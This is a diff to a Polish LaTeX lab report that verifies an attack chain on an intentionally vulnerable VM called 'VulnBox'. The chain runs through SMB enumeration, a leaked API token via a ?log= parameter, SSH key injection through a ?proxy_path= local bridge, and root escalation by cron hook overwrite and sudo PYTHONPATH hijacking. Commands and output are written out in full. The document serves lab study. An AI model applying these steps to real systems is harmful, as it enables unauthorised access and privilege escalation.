@@ -13,17 +13,19 @@ Na rysunku \ref{fig:sekwencja} przedstawiono chronologiczny przebieg komunikacji
 Pierwszym krokiem procedury weryfikacyjnej była identyfikacja otwartych portów TCP udostępnianych przez zaporę UFW na adresie \texttt{192.168.56.101} oraz weryfikacja anonimowego dostępu do usługi plikowej Samba na porcie \texttt{445/tcp} \cite{samba}.
 
 \begin{lstlisting}[language=bash, caption={Enumeracja zasobów SMB oraz pobranie pliku deployment-notes.txt}, label={lst:e2e-stage1}]
-$ nmap -sV -p 22,445,5000,8080 192.168.56.101
+$ sudo nmap -sV -p 22,445,5000,8080 192.168.56.101
 PORT     STATE    SERVICE     VERSION
-22/tcp   open     ssh         OpenSSH 9.x (Ubuntu)
-445/tcp  open     netbios-ssn Samba smbd 4.x
+22/tcp   open     ssh         OpenSSH 10.2p1 Ubuntu 2ubuntu3.8 (Ubuntu Linux; protocol 2.0)
+445/tcp  open     netbios-ssn Samba smbd 4.6.2
 5000/tcp filtered upnp
-8080/tcp open     http        nginx
+8080/tcp open     http        nginx 1.28.3 (Ubuntu)
 
 $ smbclient -N -L //192.168.56.101/
         Sharename       Type      Comment
         ---------       ----      -------
         public          Disk      VulnBox Public Deployment Notes
+        IPC$            IPC       IPC Service (VulnBox File Server)
+SMB1 disabled -- no workgroup available
 
 $ smbclient -N //192.168.56.101/public -c "get deployment-notes.txt -"
 ========================================================================
@@ -47,8 +49,6 @@ Remove this draft file from /srv/samba/public before production handover.
 \end{lstlisting}
 
 Jak wynika z listingu \ref{lst:e2e-stage1}, port \texttt{5000/tcp} jest poprawnie blokowany z zewnątrz przez zaporę UFW (\texttt{filtered}), natomiast zasób \texttt{//192.168.56.101/public} pozwala na anonimowe pobranie pliku \texttt{deployment-notes.txt}, który ujawnia lokalizację plików \texttt{/var/www/vulnbox/index.php} oraz \texttt{/opt/internal\_api/config.ini}.
-
-\Figure[0.88]{scr_01_samba.png}{Enumeracja udziału Samba i odczyt notatki wdrożeniowej z pozycji 0-knowledge}{fig:scr-samba}
 
 \section{Etap 2: Weryfikacja portalu WWW (:8080) i odczyt konfiguracji API}
 \label{sec:etap2-web}
@@ -85,14 +85,12 @@ authorized_keys_path = /home/dev/.ssh/authorized_keys
 
 W wyniku zapytania z listingu \ref{lst:e2e-stage2} uzyskano wartość statycznego tokenu autoryzacyjnego \texttt{vb-internal-9f8e7d6c5b4a3f2e1d0c} oraz potwierdzono, że serwis wewnętrzny zarządza plikiem \texttt{/home/dev/.ssh/authorized\_keys}.
 
-\Figure[0.88]{scr_02_web_php.png}{Odczyt pliku konfiguracyjnego /opt/internal\_api/config.ini przez parametr ?log= na porcie 8080}{fig:scr-web}
-
 \section{Etap 3: Komunikacja z lokalnym serwisem Flask i dostęp SSH na konto dev}
 \label{sec:etap3-flask}
 
-Ponieważ serwis Flask nasłuchuje wyłącznie na interfejsie lokalnym (\texttt{127.0.0.1:5000}), komunikację z nim zrealizowano za pośrednictwem wbudowanego w portal WWW parametru mostka lokalnego \texttt{?proxy\_path=}. Przekazując pozyskany w etapie 2 token oraz klucz publiczny SSH analityka, zarejestrowano klucz dla użytkownika \texttt{dev}, a następnie nawiązano połączenie SSH na porcie \texttt{22/tcp}.
+Ponieważ serwis Flask nasłuchuje wyłącznie na interfejsie lokalnym (\texttt{127.0.0.1:5000}), komunikację z nim zrealizowano za pośrednictwem wbudowanego w portal WWW parametru mostka lokalnego \texttt{?proxy\_path=}. Przekazując pozyskany w etapie 2 token oraz klucz publiczny SSH analityka, zarejestrowano klucz dla użytkownika \texttt{dev}, a następnie nawiązano interaktywną sesję SSH na porcie \texttt{22/tcp} i odczytano pierwszą flagę.
 
-\begin{lstlisting}[language=bash, caption={Rejestracja klucza SSH przez lokalne API (127.0.0.1:5000) i odczyt flagi user.txt}, label={lst:e2e-stage3}]
+\begin{lstlisting}[language=bash, caption={Rejestracja klucza SSH przez lokalne API (127.0.0.1:5000), logowanie SSH i odczyt user.txt}, label={lst:e2e-stage3}]
 $ curl -s "http://192.168.56.101:8080/?proxy_path=/api/v1/info&token=vb-internal-9f8e7d6c5b4a3f2e1d0c"
 {"authorized_keys_path":"/home/dev/.ssh/authorized_keys","endpoints":["/health","/api/v1/info","/api/v1/ssh-key"],"managed_account":"dev","service":"vulnbox-internal-api"}
 
@@ -100,14 +98,15 @@ $ curl -s -X POST "http://192.168.56.101:8080/?proxy_path=/api/v1/ssh-key&token=
        --data-urlencode "ssh_key=$(cat ~/.ssh/id_ed25519.pub)"
 {"account":"dev","authorized_keys_path":"/home/dev/.ssh/authorized_keys","status":"registered"}
 
-$ ssh -i ~/.ssh/id_ed25519 dev@192.168.56.101 "id && cat /home/dev/user.txt"
+$ ssh -i ~/.ssh/id_ed25519 dev@192.168.56.101
+Welcome to Ubuntu 26.04.1 LTS (GNU/Linux 7.0.0-44-generic x86_64)
+
+dev@vulnbox:~$ id && cat /home/dev/user.txt
 uid=1001(dev) gid=1001(dev) groups=1001(dev)
 FLAG{Us3r_Sh3ll!7xK9#mP2@vQ4_d3v%8nR1}
 \end{lstlisting}
 
 Poprawne zalogowanie przez SSH na konto \texttt{dev} oraz odczyt zawartości pliku \texttt{/home/dev/user.txt} (listing \ref{lst:e2e-stage3}) potwierdzają ukończenie części użytkownika nieuprzywilejowanego.
-
-\Figure[0.88]{scr_03_flask_dev.png}{Rejestracja klucza SSH w serwisie Flask API (127.0.0.1:5000) i odczyt flagi /home/dev/user.txt}{fig:scr-flask}
 
 \section{Etap 4: Weryfikacja dwóch ścieżek eskalacji do konta root}
 \label{sec:etap4-root}
@@ -120,8 +119,14 @@ Z poziomu sesji SSH użytkownika \texttt{dev} zweryfikowano obie zaprojektowane 
 Inspekcja zawartości katalogu \path{/opt/admin/hooks/} oraz pliku konfiguracyjnego \path{/etc/cron.d/vulnbox-maintenance} potwierdziła, że skrypt \path{/opt/admin/hooks/pre_backup.sh} posiada uprawnienia \texttt{0775} i grupę \texttt{dev}. Nadpisanie jego zawartości w miejscu (z zachowaniem bitu wykonywalności sprawdzanego przez \texttt{backup\_check.sh}) skutkuje automatycznym wykonaniem polecenia przez demona \texttt{cron} w kolejnej minucie w kontekście \texttt{root}.
 
 \begin{lstlisting}[language=bash, caption={Weryfikacja ścieżki zadaniowej cron (pre\_backup.sh) z poziomu konta dev}, label={lst:e2e-stage4a}]
+dev@vulnbox:~$ cat /etc/cron.d/vulnbox-maintenance
+# /etc/cron.d/vulnbox-maintenance
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+* * * * * root /opt/admin/backup_check.sh >/dev/null 2>&1
+
 dev@vulnbox:~$ ls -la /opt/admin/hooks/pre_backup.sh
--rwxrwxr-x 1 root dev 106 Nov 22 12:00 /opt/admin/hooks/pre_backup.sh
+-rwxrwxr-x 1 root dev 106 Nov 23 21:15 /opt/admin/hooks/pre_backup.sh
 
 dev@vulnbox:~$ cat << 'EOF' > /opt/admin/hooks/pre_backup.sh
 #!/usr/bin/env bash
@@ -137,17 +142,16 @@ uid=0(root) gid=0(root) groups=0(root)
 FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}
 \end{lstlisting}
 
-\Figure[0.88]{scr_04_root_cron.png}{Praktyczna weryfikacja ścieżki zadaniowej cron i potwierdzenie uprawnień root}{fig:scr-cron}
-
 \subsection{Ścieżka B: Reguła sudoers.d i przechwycenie modułu Pythona}
 \label{subsec:sciezka-b-sudo}
 
-Niezależnie od zadania cyklicznego zweryfikowano regułę \texttt{sudo -l}, która pozwala użytkownikowi \texttt{dev} na uruchomienie \texttt{/usr/bin/python3 /opt/admin/maintenance.py} jako \texttt{root} z zachowaniem zmiennej środowiskowej \texttt{PYTHONPATH} (\texttt{NOPASSWD: SETENV}). Utworzenie pomocniczego modułu \texttt{/tmp/status\_helper.py} i przekazanie ścieżki \texttt{PYTHONPATH=/tmp} powoduje załadowanie modułu w kontekście \texttt{root} i natychmiastowy odczyt flagi \texttt{/root/root.txt}.
+Niezależnie od zadania cyklicznego zweryfikowano regułę \texttt{sudo -l}, która pozwala użytkownikowi \texttt{dev} na uruchomienie \path{/usr/bin/python3} z argumentem \path{/opt/admin/maintenance.py} jako \texttt{root} z zachowaniem zmiennej środowiskowej \texttt{PYTHONPATH} (\texttt{SETENV: NOPASSWD}). Utworzenie pomocniczego modułu \texttt{/tmp/status\_helper.py} i przekazanie ścieżki \texttt{PYTHONPATH=/tmp} powoduje załadowanie modułu w kontekście \texttt{root} i natychmiastowy odczyt flagi \texttt{/root/root.txt}.
 
 \begin{lstlisting}[language=bash, caption={Weryfikacja ścieżki sudoers.d z wykorzystaniem zmiennej PYTHONPATH}, label={lst:e2e-stage4b}]
-dev@vulnbox:~$ sudo -l
+dev@vulnbox:~$ sudo -l && ls -la /opt/admin/status_helper.py
 User dev may run the following commands on vulnbox:
-    (root) NOPASSWD: SETENV: /usr/bin/python3 /opt/admin/maintenance.py
+    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/admin/maintenance.py
+-rw-rw-r-- 1 root dev 344 Nov 23 21:15 /opt/admin/status_helper.py
 
 dev@vulnbox:~$ cat << 'EOF' > /tmp/status_helper.py
 import os
@@ -163,5 +167,3 @@ EOF
 dev@vulnbox:~$ sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/admin/maintenance.py
 [VulnBox Maintenance] System summary: {"euid": 0, "root_flag": "FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}"}
 \end{lstlisting}
-
-\Figure[0.88]{scr_05_root_sudo.png}{Praktyczna weryfikacja ścieżki sudoers.d (PYTHONPATH) i odczyt flagi /root/root.txt}{fig:scr-sudo}
